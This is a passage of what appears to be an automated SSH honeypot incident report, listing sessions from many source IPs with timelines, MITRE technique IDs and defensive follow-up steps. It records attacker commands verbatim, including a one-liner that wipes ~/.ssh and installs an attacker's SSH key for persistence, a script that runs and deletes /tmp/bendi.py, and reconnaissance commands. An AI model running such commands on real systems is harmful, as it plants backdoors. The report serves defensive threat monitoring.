| `2026-07-21 07:43:30` | `cowrie.client.kex` |
| `2026-07-21 07:43:31` | `cowrie.login.success` |
| `2026-07-21 07:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b40f22040c

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 07:43 |
| **Last Seen** | 2026-07-21 07:45 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:43:32` | `cowrie.session.connect` |
| `2026-07-21 07:43:32` | `cowrie.client.version` |
| `2026-07-21 07:43:32` | `cowrie.client.kex` |
| `2026-07-21 07:43:33` | `cowrie.login.success` |
| `2026-07-21 07:43:35` | `cowrie.session.file_upload` |
| `2026-07-21 07:43:36` | `cowrie.session.params` |
| `2026-07-21 07:43:36` | `cowrie.command.input` |
| `2026-07-21 07:43:36` | `cowrie.command.input` |
| `2026-07-21 07:43:36` | `cowrie.command.input` |
| `2026-07-21 07:43:36` | `cowrie.command.failed` |
| `2026-07-21 07:43:36` | `cowrie.log.closed` |
| `2026-07-21 07:43:37` | `cowrie.session.params` |
| `2026-07-21 07:43:37` | `cowrie.command.input` |
| `2026-07-21 07:43:37` | `cowrie.log.closed` |
| `2026-07-21 07:43:38` | `cowrie.session.params` |
| `2026-07-21 07:43:38` | `cowrie.command.input` |
| `2026-07-21 07:43:39` | `cowrie.log.closed` |
| `2026-07-21 07:43:40` | `cowrie.session.params` |
| `2026-07-21 07:43:40` | `cowrie.command.input` |
| `2026-07-21 07:43:40` | `cowrie.command.failed` |
| `2026-07-21 07:43:40` | `cowrie.command.failed` |
| `2026-07-21 07:44:41` | `cowrie.session.params` |
| `2026-07-21 07:44:41` | `cowrie.command.input` |
| `2026-07-21 07:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0542354c1baf

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-07-21 07:43 |
| **Last Seen** | 2026-07-21 07:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:43:33` | `cowrie.session.connect` |
| `2026-07-21 07:43:33` | `cowrie.client.version` |
| `2026-07-21 07:43:33` | `cowrie.client.kex` |
| `2026-07-21 07:43:35` | `cowrie.login.success` |
| `2026-07-21 07:43:36` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc522080a16

| Field | Detail |
|---|---|
| **Source IP** | `111.39.206[.]23` |
| **First Seen** | 2026-07-21 07:43 |
| **Last Seen** | 2026-07-21 07:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:43:33` | `cowrie.session.connect` |
| `2026-07-21 07:43:35` | `cowrie.client.version` |
| `2026-07-21 07:43:35` | `cowrie.client.kex` |
| `2026-07-21 07:43:40` | `cowrie.login.success` |
| `2026-07-21 07:43:41` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.206[.]23` to AbuseIPDB if not already reported
- [ ] Block `111.39.206[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ce6caf3049

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 07:45 |
| **Last Seen** | 2026-07-21 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:45:31` | `cowrie.session.connect` |
| `2026-07-21 07:45:31` | `cowrie.client.version` |
| `2026-07-21 07:45:31` | `cowrie.client.kex` |
| `2026-07-21 07:45:31` | `cowrie.login.success` |
| `2026-07-21 07:45:31` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:45:32` | `cowrie.direct-tcpip.data` |
| `2026-07-21 07:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e260aa12e0

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 07:45 |
| **Last Seen** | 2026-07-21 07:47 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:45:41` | `cowrie.session.connect` |
| `2026-07-21 07:45:41` | `cowrie.client.version` |
| `2026-07-21 07:45:41` | `cowrie.client.kex` |
| `2026-07-21 07:45:42` | `cowrie.login.success` |
| `2026-07-21 07:45:44` | `cowrie.session.file_upload` |
| `2026-07-21 07:45:45` | `cowrie.session.params` |
| `2026-07-21 07:45:45` | `cowrie.command.input` |
| `2026-07-21 07:45:45` | `cowrie.command.input` |
| `2026-07-21 07:45:45` | `cowrie.command.input` |
| `2026-07-21 07:45:45` | `cowrie.command.failed` |
| `2026-07-21 07:45:45` | `cowrie.log.closed` |
| `2026-07-21 07:45:46` | `cowrie.session.params` |
| `2026-07-21 07:45:46` | `cowrie.command.input` |
| `2026-07-21 07:45:47` | `cowrie.log.closed` |
| `2026-07-21 07:45:48` | `cowrie.session.params` |
| `2026-07-21 07:45:48` | `cowrie.command.input` |
| `2026-07-21 07:45:48` | `cowrie.log.closed` |
| `2026-07-21 07:45:49` | `cowrie.session.params` |
| `2026-07-21 07:45:49` | `cowrie.command.input` |
| `2026-07-21 07:45:49` | `cowrie.command.failed` |
| `2026-07-21 07:45:49` | `cowrie.command.failed` |
| `2026-07-21 07:46:50` | `cowrie.session.params` |
| `2026-07-21 07:46:50` | `cowrie.command.input` |
| `2026-07-21 07:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6996ed6d19

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-07-21 07:46 |
| **Last Seen** | 2026-07-21 07:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:46:54` | `cowrie.session.connect` |
| `2026-07-21 07:46:55` | `cowrie.client.version` |
| `2026-07-21 07:46:55` | `cowrie.client.kex` |
| `2026-07-21 07:46:57` | `cowrie.login.success` |
| `2026-07-21 07:46:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63466a0fa375

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-07-21 07:47 |
| **Last Seen** | 2026-07-21 07:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:47:03` | `cowrie.session.connect` |
| `2026-07-21 07:47:03` | `cowrie.client.version` |
| `2026-07-21 07:47:03` | `cowrie.client.kex` |
| `2026-07-21 07:47:05` | `cowrie.login.success` |
| `2026-07-21 07:47:05` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ac770bff7c

| Field | Detail |
|---|---|
| **Source IP** | `218.28.18[.]2` |
| **First Seen** | 2026-07-21 07:53 |
| **Last Seen** | 2026-07-21 07:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:53:23` | `cowrie.session.connect` |
| `2026-07-21 07:53:23` | `cowrie.client.version` |
| `2026-07-21 07:53:23` | `cowrie.client.kex` |
| `2026-07-21 07:53:26` | `cowrie.login.success` |
| `2026-07-21 07:53:26` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.28.18[.]2` to AbuseIPDB if not already reported
- [ ] Block `218.28.18[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318bfe16045e

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-07-21 07:53 |
| **Last Seen** | 2026-07-21 07:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:53:32` | `cowrie.session.connect` |
| `2026-07-21 07:53:32` | `cowrie.client.version` |
| `2026-07-21 07:53:32` | `cowrie.client.kex` |
| `2026-07-21 07:53:33` | `cowrie.login.success` |
| `2026-07-21 07:53:34` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f690b0e54d24

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 07:54 |
| **Last Seen** | 2026-07-21 07:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:54:11` | `cowrie.session.connect` |
| `2026-07-21 07:54:12` | `cowrie.client.version` |
| `2026-07-21 07:54:12` | `cowrie.client.kex` |
| `2026-07-21 07:54:14` | `cowrie.login.success` |
| `2026-07-21 07:54:14` | `cowrie.session.params` |
| `2026-07-21 07:54:14` | `cowrie.command.input` |
| `2026-07-21 07:54:14` | `cowrie.log.closed` |
| `2026-07-21 07:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7edb3cbd2652

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-07-21 07:56 |
| **Last Seen** | 2026-07-21 07:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:56:19` | `cowrie.session.connect` |
| `2026-07-21 07:56:20` | `cowrie.client.version` |
| `2026-07-21 07:56:20` | `cowrie.client.kex` |
| `2026-07-21 07:56:21` | `cowrie.login.success` |
| `2026-07-21 07:56:21` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ada9f328546

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 08:01 |
| **Last Seen** | 2026-07-21 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:01:32` | `cowrie.session.connect` |
| `2026-07-21 08:01:32` | `cowrie.client.version` |
| `2026-07-21 08:01:32` | `cowrie.client.kex` |
| `2026-07-21 08:01:32` | `cowrie.login.success` |
| `2026-07-21 08:01:33` | `cowrie.session.params` |
| `2026-07-21 08:01:33` | `cowrie.command.input` |
| `2026-07-21 08:01:33` | `cowrie.log.closed` |
| `2026-07-21 08:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a3be1805ad

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-21 08:04 |
| **Last Seen** | 2026-07-21 08:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:04:51` | `cowrie.session.connect` |
| `2026-07-21 08:04:52` | `cowrie.client.version` |
| `2026-07-21 08:04:52` | `cowrie.client.kex` |
| `2026-07-21 08:04:54` | `cowrie.login.success` |
| `2026-07-21 08:04:54` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0685a2aee22f

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-21 08:04 |
| **Last Seen** | 2026-07-21 08:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:04:59` | `cowrie.session.connect` |
| `2026-07-21 08:04:59` | `cowrie.client.version` |
| `2026-07-21 08:04:59` | `cowrie.client.kex` |
| `2026-07-21 08:05:01` | `cowrie.login.success` |
| `2026-07-21 08:05:01` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5a58263feb7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.93[.]39` |
| **First Seen** | 2026-07-21 08:06 |
| **Last Seen** | 2026-07-21 08:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:06:40` | `cowrie.session.connect` |
| `2026-07-21 08:06:40` | `cowrie.client.version` |
| `2026-07-21 08:06:40` | `cowrie.client.kex` |
| `2026-07-21 08:06:41` | `cowrie.login.success` |
| `2026-07-21 08:06:42` | `cowrie.session.params` |
| `2026-07-21 08:06:42` | `cowrie.command.input` |
| `2026-07-21 08:06:42` | `cowrie.command.failed` |
| `2026-07-21 08:06:43` | `cowrie.log.closed` |
| `2026-07-21 08:06:43` | `cowrie.session.params` |
| `2026-07-21 08:06:43` | `cowrie.command.input` |
| `2026-07-21 08:06:44` | `cowrie.session.file_download` |
| `2026-07-21 08:06:44` | `cowrie.log.closed` |
| `2026-07-21 08:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.93[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.223.93[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e31c47ddad4b

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-07-21 08:06 |
| **Last Seen** | 2026-07-21 08:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:06:43` | `cowrie.session.connect` |
| `2026-07-21 08:06:43` | `cowrie.client.version` |
| `2026-07-21 08:06:43` | `cowrie.client.kex` |
| `2026-07-21 08:06:44` | `cowrie.login.success` |
| `2026-07-21 08:06:46` | `cowrie.session.params` |
| `2026-07-21 08:06:46` | `cowrie.command.input` |
| `2026-07-21 08:06:46` | `cowrie.command.failed` |
| `2026-07-21 08:06:46` | `cowrie.log.closed` |
| `2026-07-21 08:06:47` | `cowrie.session.params` |
| `2026-07-21 08:06:47` | `cowrie.command.input` |
| `2026-07-21 08:06:47` | `cowrie.session.file_download` |
| `2026-07-21 08:06:47` | `cowrie.log.closed` |
| `2026-07-21 08:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8369c2350292

| Field | Detail |
|---|---|
| **Source IP** | `159.223.93[.]39` |
| **First Seen** | 2026-07-21 08:06 |
| **Last Seen** | 2026-07-21 08:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:06:44` | `cowrie.session.connect` |
| `2026-07-21 08:06:44` | `cowrie.client.version` |
| `2026-07-21 08:06:44` | `cowrie.client.kex` |
| `2026-07-21 08:06:46` | `cowrie.login.success` |
| `2026-07-21 08:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.93[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.223.93[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d18816dcd5

| Field | Detail |
|---|---|
| **Source IP** | `159.223.93[.]39` |
| **First Seen** | 2026-07-21 08:06 |
| **Last Seen** | 2026-07-21 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:06:46` | `cowrie.session.connect` |
| `2026-07-21 08:06:46` | `cowrie.client.version` |
| `2026-07-21 08:06:47` | `cowrie.client.kex` |
| `2026-07-21 08:06:48` | `cowrie.login.success` |
| `2026-07-21 08:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.93[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.223.93[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-194501f9caae

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-07-21 08:06 |
| **Last Seen** | 2026-07-21 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:06:48` | `cowrie.session.connect` |
| `2026-07-21 08:06:48` | `cowrie.client.version` |
| `2026-07-21 08:06:48` | `cowrie.client.kex` |
| `2026-07-21 08:06:49` | `cowrie.login.success` |
| `2026-07-21 08:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28aebc6a69e

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-07-21 08:06 |
| **Last Seen** | 2026-07-21 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:06:50` | `cowrie.session.connect` |
| `2026-07-21 08:06:50` | `cowrie.client.version` |
| `2026-07-21 08:06:50` | `cowrie.client.kex` |
| `2026-07-21 08:06:51` | `cowrie.login.success` |
| `2026-07-21 08:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc0abb2e6a4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.9[.]143` |
| **First Seen** | 2026-07-21 08:08 |
| **Last Seen** | 2026-07-21 08:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:08:07` | `cowrie.session.connect` |
| `2026-07-21 08:08:08` | `cowrie.client.version` |
| `2026-07-21 08:08:08` | `cowrie.client.kex` |
| `2026-07-21 08:08:10` | `cowrie.login.success` |
| `2026-07-21 08:08:11` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.9[.]143` to AbuseIPDB if not already reported
- [ ] Block `111.70.9[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f595a4b73536

| Field | Detail |
|---|---|
| **Source IP** | `220.116.26[.]179` |
| **First Seen** | 2026-07-21 08:13 |
| **Last Seen** | 2026-07-21 08:14 |
| **Session Duration** | 52s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:13:29` | `cowrie.session.connect` |
| `2026-07-21 08:13:29` | `cowrie.client.version` |
| `2026-07-21 08:13:30` | `cowrie.client.kex` |
| `2026-07-21 08:13:31` | `cowrie.login.failed` |
| `2026-07-21 08:13:32` | `cowrie.login.success` |
| `2026-07-21 08:13:33` | `cowrie.session.params` |
| `2026-07-21 08:13:33` | `cowrie.command.input` |
